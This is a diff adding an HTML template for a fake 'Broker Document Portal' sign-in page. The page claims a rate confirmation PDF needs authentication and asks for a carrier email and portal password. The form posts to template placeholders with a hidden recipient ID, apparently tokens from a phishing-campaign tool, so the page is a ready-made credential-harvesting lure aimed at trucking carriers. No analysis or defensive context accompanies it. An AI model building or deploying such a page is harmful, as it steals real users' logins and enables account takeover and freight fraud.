@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Broker Document Portal</title>
+    <style>
+      body { font-family: 'Segoe UI', Arial, sans-serif; background: #eef1f4;
+             margin: 0; padding: 0; color: #222; }
+      header { background: #0e2a4a; color: #fff; padding: 14px 24px; font-weight: 600; }
+      .card { max-width: 420px; margin: 60px auto; background: #fff;
+              border: 1px solid #ccd2da; border-radius: 4px; padding: 28px; }
+      h2 { margin: 0 0 4px; font-size: 18px; }
+      p.lead { font-size: 13px; color: #555; margin: 0 0 18px; }
+      label { display: block; font-size: 12px; color: #444; margin: 10px 0 4px; }
+      input { width: 100%; padding: 8px; border: 1px solid #c0c6cd;
+              border-radius: 3px; box-sizing: border-box; font-size: 14px; }
+      button { margin-top: 18px; width: 100%; padding: 10px;
+               background: #0e2a4a; color: #fff; border: 0; border-radius: 3px;
+               font-size: 14px; cursor: pointer; }
+      .footer { font-size: 11px; color: #888; text-align: center; margin-top: 20px; }
+    </style>
+  </head>
+  <body>
+    <header>Broker Document Portal</header>
+    <div class="card">
+      <h2>Sign in to download rate confirmation</h2>
+      <p class="lead">Document <b>RC-2241885.pdf</b> requires authentication.</p>
+      <form action="{{.URL}}" method="post" autocomplete="off">
+        <input type="hidden" name="rid" value="{{.RId}}">
+        <label for="email">Carrier email</label>
+        <input id="email" name="carrier_email" type="text">
+        <label for="pw">Portal password</label>
+        <input id="pw" name="portal_pw" type="password">
+        <button type="submit">Sign in &amp; download</button>
+      </form>
+      <p class="footer">Trouble signing in? Contact your account manager.</p>
+    </div>
+  </body>
+</html>
